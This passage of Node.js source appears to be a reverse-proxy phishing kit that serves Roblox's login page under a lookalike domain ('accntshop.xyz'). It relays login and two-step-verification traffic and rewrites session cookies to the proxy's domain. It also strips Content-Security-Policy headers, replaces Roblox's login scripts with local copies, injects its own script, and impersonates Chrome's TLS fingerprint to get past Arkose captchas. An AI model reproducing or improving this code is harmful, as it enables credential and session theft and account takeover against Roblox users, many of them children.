                // For Arkose/rbxcdn, use their own origin/referer
                if (isArkose) {
                    const arkoseOrigin = target.replace(/\/+$/, '');
                    proxyReq.setHeader('origin', arkoseOrigin);
                    proxyReq.setHeader('referer', `${arkoseOrigin}/`);
                } else {
                    proxyReq.setHeader('origin', 'https://www.roblox.com');
                    proxyReq.setHeader('referer', 'https://www.roblox.com/login');
                }
                
                proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
                proxyReq.setHeader('accept', req.headers['accept'] || 'application/json, text/plain, */*');
                proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
                proxyReq.setHeader('accept-encoding', 'gzip, deflate, br');
                proxyReq.setHeader('connection', 'keep-alive');
                
                if (req.headers['x-csrf-token']) proxyReq.setHeader('x-csrf-token', req.headers['x-csrf-token']);
                if (req.headers['rbx-device-id']) proxyReq.setHeader('rbx-device-id', req.headers['rbx-device-id']);
                if (req.headers['rbxdeviceid']) proxyReq.setHeader('rbxdeviceid', req.headers['rbxdeviceid']);
                if (req.headers['x-bound-auth-token']) proxyReq.setHeader('x-bound-auth-token', req.headers['x-bound-auth-token']);
                
                for (const h of CHALLENGE_HEADERS) {
                    if (req.headers[h]) proxyReq.setHeader(h, req.headers[h]);
                }
                } catch (err) {
                    if (err.code === 'ERR_HTTP_HEADERS_SENT') {
                        console.warn(`[${prefix}] ⚠️  proxyReq: headers already sent, skipping`);
                    } else {
                        throw err;
                    }
                }
            },

            proxyRes: (proxyRes, req) => {
                // Log successful Arkose Labs responses
                if (isArkose && proxyRes.statusCode === 200) {
                    console.log(`[${prefix}] ✅ ${req.method} ${req.path} → ${proxyRes.statusCode}`);
                }
                
                if (proxyRes.headers['set-cookie']) {
                    const host = req.headers.host || 'localhost';
                    proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
                }
                
                // CRITICAL: Strip CSP headers so browser doesn't block proxy URLs
                delete proxyRes.headers['content-security-policy'];
                delete proxyRes.headers['content-security-policy-report-only'];
                delete proxyRes.headers['x-content-security-policy'];
                
                const origin = req.headers['origin'] || `https://${req.headers.host}`;
                proxyRes.headers['access-control-allow-origin'] = origin;
                proxyRes.headers['access-control-allow-credentials'] = 'true';
                proxyRes.headers['access-control-allow-methods'] = 'GET, POST, PUT, DELETE, OPTIONS, PATCH';
                proxyRes.headers['access-control-allow-headers'] = [
                    'Content-Type', 'x-csrf-token', 'Authorization', 'rbx-device-id', 'rbxdeviceid',
                    'x-bound-auth-token', 'Accept', 'Accept-Language', 'Accept-Encoding',
                    ...CHALLENGE_HEADERS
                ].join(', ');
                proxyRes.headers['access-control-expose-headers'] = ['x-csrf-token', ...CHALLENGE_HEADERS].join(', ');
            },

            error: (err, req, res) => {
                if (req.path === '/www/e.png' || req.path === '/pe') {
                    res.status(204).end();
                    return;
                }
                console.error(`[${prefix}] ❌ ${req.method} ${req.path} | ${err.code}: ${err.message}`);
                if (!res.headersSent) {
                    res.status(502).json({ error: 'Proxy error', code: err.code });
                }
            }
        }
    });
}

// ─────────────────────────────────────────────────────────────
// ROOT-LEVEL API PASS-THROUGH
// EnvironmentUrls.js sets many APIs to location.origin (the proxy
// root), so calls like /v1/thumbnails/metadata, /captcha/v1/metadata,
// /v2/login etc. arrive at the proxy root with no prefix.
// We map them to the correct Roblox subdomain here.
// ─────────────────────────────────────────────────────────────
const ROOT_PASS_THROUGH = [
    // Path prefix → Roblox target
    ['/v1/thumbnails',          'https://thumbnails.roblox.com'],
    ['/v2/thumbnails',          'https://thumbnails.roblox.com'],
    ['/captcha/v1',             'https://captcha.roblox.com'],
    ['/v1/users',               'https://users.roblox.com'],
    ['/v2/users',               'https://users.roblox.com'],
    ['/v1/friends',             'https://friends.roblox.com'],
    ['/v1/presence',            'https://presence.roblox.com'],
    ['/v1/groups',              'https://groups.roblox.com'],
    ['/v1/catalog',             'https://catalog.roblox.com'],
    ['/v1/economy',             'https://economy.roblox.com'],
    ['/v1/games',               'https://games.roblox.com'],
    ['/v1/badges',              'https://badges.roblox.com'],
    ['/v1/avatar',              'https://avatar.roblox.com'],
    ['/universal-app-configuration', 'https://apis.roblox.com'],
    ['/showcases-api',          'https://apis.roblox.com'],
    ['/two-step-verification',  'https://twostepverification.roblox.com'],
];

for (const [prefix, target] of ROOT_PASS_THROUGH) {
    app.use(prefix, createProxyMiddleware({
        target,
        changeOrigin: true,
        secure: true,
        proxyTimeout: 30000,
        timeout: 30000,
        agent: httpsAgent,
        on: {
            proxyReq: (proxyReq, req) => {
                proxyReq.setHeader('origin', 'https://www.roblox.com');
                proxyReq.setHeader('referer', 'https://www.roblox.com/');
                proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
                proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
                if (req.headers['x-csrf-token']) proxyReq.setHeader('x-csrf-token', req.headers['x-csrf-token']);
                if (req.headers['cookie']) proxyReq.setHeader('cookie', req.headers['cookie']);
            },
            proxyRes: (proxyRes, req) => {
                delete proxyRes.headers['content-security-policy'];
                delete proxyRes.headers['content-security-policy-report-only'];
                const origin = req.headers['origin'] || `https://${req.headers.host}`;
                proxyRes.headers['access-control-allow-origin'] = origin;
                proxyRes.headers['access-control-allow-credentials'] = 'true';
            },
            error: (err, req, res) => {
                if (!res.headersSent) res.status(502).json({ error: 'Proxy error', code: err.code });
            }
        }
    }));
}

// Register all subdomain-prefixed API proxies
// Arkose/funcaptcha/rbxcdn → curl-impersonate (Chrome TLS fingerprint)
// All other Roblox APIs    → http-proxy-middleware (fast, no fingerprint concern)
//
// isArkose checks BOTH the target URL AND the prefix name because some Arkose
// endpoints are hosted on roblox.com subdomains (e.g. arkoselabs.roblox.com)
// which don't contain 'arkoselabs.com' as a substring.
for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
    const isArkose = target.includes('arkoselabs.com')
        || target.includes('funcaptcha.com')
        || target.includes('rbxcdn.com')
        || prefix.startsWith('arkose')        // catches all arkose-* prefixes
        || prefix.includes('rbxcdn')          // catches arkoselabs-rbxcdn, captcha-rbxcdn, apis-rbxcdn
        || target.includes('arkoselabs.');    // catches arkoselabs.roblox.com etc.
    if (isArkose) {
        app.use(`/${prefix}`, createArkoseCurlProxy(prefix, target));
    } else {
        app.use(`/${prefix}`, createRobloxProxy(prefix, target));
    }
}

app.use('/', createProxyMiddleware({
    target: 'https://www.roblox.com',
    changeOrigin: true,
    secure: true,
    selfHandleResponse: true,
    proxyTimeout: 30000,
    timeout: 30000,
    agent: httpsAgent,

    pathRewrite: (path) => (path === '/' ? '/login' : path),

    on: {
        proxyReq: (proxyReq, req) => {
            proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
            proxyReq.setHeader('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
            proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
            proxyReq.setHeader('accept-encoding', 'gzip, deflate, br');
            proxyReq.setHeader('connection', 'keep-alive');
        },

        proxyRes: responseInterceptor(async (buffer, proxyRes, req, res) => {
            // CRITICAL: Strip CSP headers so browser doesn't block proxy URLs
            delete proxyRes.headers['content-security-policy'];
            delete proxyRes.headers['content-security-policy-report-only'];
            delete proxyRes.headers['x-content-security-policy'];
            
            // CRITICAL: Rewrite cookies for initial page load
            const host = req.headers.host || 'accntshop.xyz';
            if (proxyRes.headers['set-cookie']) {
                proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
                console.log(`[main] 🍪 Rewrote ${proxyRes.headers['set-cookie'].length} cookies to domain: .${host.replace(/^www\./, '')}`);
            }

            // Set CORS headers
            const origin = req.headers['origin'] || `https://${host}`;
            res.setHeader('access-control-allow-origin', origin);
            res.setHeader('access-control-allow-credentials', 'true');
            res.setHeader('access-control-expose-headers', ['x-csrf-token', ...CHALLENGE_HEADERS].join(', '));

            const ct = proxyRes.headers['content-type'] || '';

            if (ct.includes('text/html')) {
                let body = buffer.toString('utf8');
                body = rewriteUrls(body, host);

                // STEP 1: Rewrite 4 CDN bundles to our custom /js/ routes
                body = body.replace(/https?:\/\/[^"'\s]+[a-f0-9]{10,}-Challenge\.js/g, '/js/Challenge.js');
                body = body.replace(/https?:\/\/[^"'\s]+[a-f0-9]{10,}-ReactLogin\.js(\?[^"']*)?/g, '/js/ReactLogin.js?v=1');
                body = body.replace(/https?:\/\/[^"'\s]+[a-f0-9]{10,}-CoreUtilities\.js/g, '/js/CoreUtilities.js');
                // Also catch non-hashed CoreUtilities (proxied via js-cdn)
                body = body.replace(/https?:\/\/[^"'\s]+\/0eff3f0f1cf697f41279f298df58cc9c047532cec5c3b0035d8236c5386eb8ac-CoreUtilities\.js/g, '/js/CoreUtilities.js');

                // STEP 2: Inject BAT meta tags server-side from prelude vm
                try {
                    const blobs = await fetchPreludeBlobs();
                    if (blobs && (blobs.proxyBlob || blobs.tokenBlob || blobs.secureHash)) {
                        const batMeta = [
                            `\t<meta name="proxy"  value="${blobs.proxyBlob}">`,
                            `\t<meta name="token"  value="${blobs.tokenBlob}">`,
                            `\t<meta name="secure" value="${blobs.secureHash}">`,
                            `\t<meta name="meta"   value="${blobs.metaVal}">`,
                        ].join('\n');
                        body = body.replace('</head>', batMeta + '\n</head>');
                        console.log('[prelude-vm] ✅ Injected BAT meta tags into HTML');
                    } else {
                        console.warn('[prelude-vm] ⚠️  No BAT blobs — meta tags skipped');
                    }
                } catch (err) {
                    console.error('[prelude-vm] ❌ Meta injection failed:', err.message);
                }

                // STEP 3: Inject URL-rewrite + challenge interceptor script
                const script = buildInjectedScript(host);
                body = body.replace('<head', `<head>${script}`);
                return body;
            }
            return buffer;
        }),

        error: (err, req, res) => {
            console.error(`[main] ❌ ${req.method} ${req.path} | ${err.code}: ${err.message}`);
            if (!res.headersSent) {
                res.status(502).send('Proxy error');
            }
        }
    }
}));

const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Proxy running on port ${PORT}`);
    console.log(`📋 rbxcdn.com domains mapped:`);
    console.log(`   - apis.rbxcdn.com → /apis-rbxcdn`);
    console.log(`   - captcha.rbxcdn.com → /captcha-rbxcdn`);
    console.log(`   - arkoselabs.roblox.com → /arkoselabs-rbxcdn`);
    console.log(`📋 Arkose Labs domains mapped:`);
    console.log(`   - roblox-api.arkoselabs.com → /arkose-api`);
    console.log(`   - client-api.arkoselabs.com → /arkose-client`);
    console.log(`   - cdn.arkoselabs.com → /arkose-cdn`);
    console.log(`   - funcaptcha.com → /arkose-funcaptcha`);
});
